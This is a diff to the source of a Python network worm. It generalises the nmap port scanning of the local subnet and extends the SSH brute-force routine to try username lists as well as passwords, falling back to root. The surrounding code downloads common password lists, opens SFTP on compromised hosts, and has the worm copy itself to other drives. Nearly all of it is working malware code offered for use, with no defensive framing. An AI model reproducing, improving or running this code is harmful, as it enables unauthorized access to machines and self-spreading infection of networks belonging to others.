@@ -14,7 +14,7 @@ import time
 from ftplib import FTP
 import ftplib
 from shutil import copy2
-import win32api
+#import win32api
 import netifaces
 from threading import Thread
 
@@ -33,40 +33,21 @@ coloredlogs.install(fmt='%(message)s',level='DEBUG', logger=logger)
 gws = netifaces.gateways()
 gateway = gws['default'][netifaces.AF_INET][0]
 
-def scan_ssh_hosts():
+def scan_hosts(port):
     """
     Scans all machines on the same network that
      have SSH (port 22) enabled
-
     Returns:
         IP addresses of hosts
     """
-    logger.debug("Scanning machines on the same network with port 22 open.")
+    logger.debug(f"Scanning machines on the same network with port {port} open.")
 
 
     logger.debug("Gateway: " + gateway)
 
     port_scanner = nmap.PortScanner()
-    port_scanner.scan(gateway + "/24", arguments='-p 22 --open')
+    port_scanner.scan(gateway + "/24", arguments='-p'+str(port)+' --open')
 
-    all_hosts = port_scanner.all_hosts()
-
-    logger.debug("Hosts: " + str(all_hosts))
-    return all_hosts
-
-
-def scan_ftp_hosts():
-    """
-    Scans all machines on the same network that
-     have FTP (port 21) enabled
-
-    Returns:
-        IP addresses of hosts
-    """
-    logger.debug("Scanning machines on the same network with port 21 open.")
-
-    port_scanner = nmap.PortScanner()
-    port_scanner.scan(gateway + '/24', arguments='-p 21 --open')
     all_hosts = port_scanner.all_hosts()
 
     logger.debug("Hosts: " + str(all_hosts))
@@ -77,7 +58,6 @@ def download_ssh_passwords(filename):
     """
      Downloads most commonly used ssh passwords from a specific url
       Clearly, you can store passwords in a dictionary, but i found this more comfortable
-
     Args:
         filename - Name to save the file as.
     """
@@ -100,26 +80,24 @@ def connect_to_ftp(host, username, password):
         pass
 
 
-def connect_to_ssh(host, password):
+def connect_to_ssh(host, username, password):
     """
     Tries to connect to a SSH server
-
     Returns:
         True - Connection successful
         False - Something went wrong
-
     Args:
         host - Target machine's IP
         password - Password to use
     """
 
-    # TODO:120 Pass usernames to the function too
-
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    if username is None:
+    	username = "root"
     try:
         logger.debug("Connecting to: " + host)
-        client.connect(host, 22, "root", password)
+        client.connect(host, 22, username, password)
         logger.debug("Successfully connected!")
 
         sftp = client.open_sftp()
@@ -138,21 +116,29 @@ def connect_to_ssh(host, password):
         return False
 
 
-def bruteforce_ssh(host, wordlist):
+def bruteforce_ssh(host, userlist, wordlist):
     """
     Calls connect_to_ssh function and
     tries to bruteforce the target server.
-
     Args:
         wordlist - TXT file with passwords
-
+        userlist - TXT file with usernames
     """
-    # TODO:10 : Bruteforce usernames too
-    file = open(wordlist, "r")
-    for line in file:
-        connection = connect_to_ssh(host, line)
-        print(connection)
-        time.sleep(5)
+    # Bruteforces usernames and passwords
+    passfile = open(wordlist, "r")
+    try:
+        userfile = open(userlist, "r")
+        for user in userfile:
+    	    for password in passfile:
+    	        connection = connect_to_ssh(host, user, password)
+    	        print(connection)
+    	        time.sleep(5)
+    #Bruteforces passwords using root as the username
+    except:
+        for password in passfile:
+            connection = connect_to_ssh(host, None, password)
+            print(connection)
+            time.sleep(5)
 
 def drivespreading():
     # This function makes the worm copy itself on other drives on the computer
@@ -187,7 +173,6 @@ def start_drive_spreading():
 
 def main():
     start_drive_spreading()
-
 
 if __name__ == "__main__":
     main()
